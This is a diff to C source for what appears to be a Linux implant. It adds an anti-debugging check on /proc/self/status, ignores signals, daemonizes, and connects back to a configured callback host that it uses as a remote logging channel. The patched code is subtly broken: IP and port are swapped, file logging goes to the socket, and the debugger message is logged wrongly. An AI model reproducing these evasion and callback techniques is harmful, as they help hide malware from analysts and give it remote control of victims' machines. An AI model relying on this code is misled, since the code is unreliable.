@@ -2,6 +2,7 @@
 #include "setup.h"
 #include <asm-generic/socket.h>
 #include <netinet/in.h>
+#include <stdio.h>
 #include <sys/socket.h>
 #include <sys/stat.h>
 #include <unistd.h>
@@ -10,6 +11,7 @@ static bool debugger_is_attached(void)
 {
     char buf[4096] = {0};
 
+    __log("Seeking debugger");
     const int status_fd = open("/proc/self/status", O_RDONLY);
     if (status_fd == -1) {
         KILL("could not open /proc/self/status");
@@ -30,14 +32,19 @@ static bool debugger_is_attached(void)
     while (++char_ptr <= buf + num_read) {
         if (isspace(*char_ptr))
             continue;
-        else return isdigit(*char_ptr) != 0 && *char_ptr != '0';
+        else {
+            __log("found debugger, exiting");
+            return isdigit(*char_ptr) != 0 && *char_ptr != '0';
+        }
     }
+    __log("No debugger found");
     return false;
 }
 
 static void setup_log(void)
 {
-    g_logfd = open(LOG_PATH, O_WRONLY | O_TRUNC | O_CREAT, S_IRUSR);
+    g_settings.logfd = open(LOG_PATH, O_WRONLY | O_TRUNC | O_CREAT, S_IRUSR);
+    __log("Log file setup");
 }
 
 static void setup_socket(void)
@@ -45,33 +52,22 @@ static void setup_socket(void)
     int flag = 1;
     struct sockaddr_in addr = {
         .sin_family = AF_INET,
-        .sin_port = htons(atoi(CALLBACK_PORT)),
-        .sin_addr.s_addr = inet_addr(CALLBACK_IP)
+        .sin_port = htons(atoi(g_settings.target_ip)),
+        .sin_addr.s_addr = inet_addr(g_settings.target_port)
     };
-    g_sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
-    if (!g_sockfd)
+    g_settings.sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (!g_settings.sockfd)
         return;
-    else if (setsockopt(g_sockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,
+    else if (setsockopt(g_settings.sockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,
         &flag, sizeof(int)) < 0)
         return;
-    else if (connect(g_sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
+    else if (connect(g_settings.sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
         return;
+    __log("Successfully connected to server");
 }
 
-void init(void)
-{
-    signal(SIGCHLD, SIG_IGN);
-    signal(SIGHUP, SIG_IGN);
-    signal(SIGTRAP, SIG_IGN);
-
-    setup_log();
-    setup_socket();
-    if (debugger_is_attached())
-        exit(1);
-}
-
-void daemonize(void)
+static void daemonize(void)
 {
     register int file_desc = sysconf(_SC_OPEN_MAX);
 
@@ -80,6 +76,36 @@ void daemonize(void)
     umask(0);
     while (file_desc-- >= 0)
         close(file_desc);
+}
+
+void __log(char const *s)
+{
+    if (g_settings.sockfd != -1)
+        dprintf(g_settings.sockfd, "%s\n", s);
+    if (g_settings.logfd != -1)
+        dprintf(g_settings.sockfd, "%s\n", s);
+}
+
+void flush(void)
+{
+    __log("good bye");
+    close(g_settings.sockfd);
+    close(g_settings.logfd);
+    _exit(1);
+}
+
+void init(void)
+{
+    signal(SIGCHLD, SIG_IGN);
+    signal(SIGHUP, SIG_IGN);
+    signal(SIGTRAP, SIG_IGN);
+
+    daemonize();
+    setup_log();
+    setup_socket();
+
+    if (debugger_is_attached())
+        exit(1);
 }
 
 
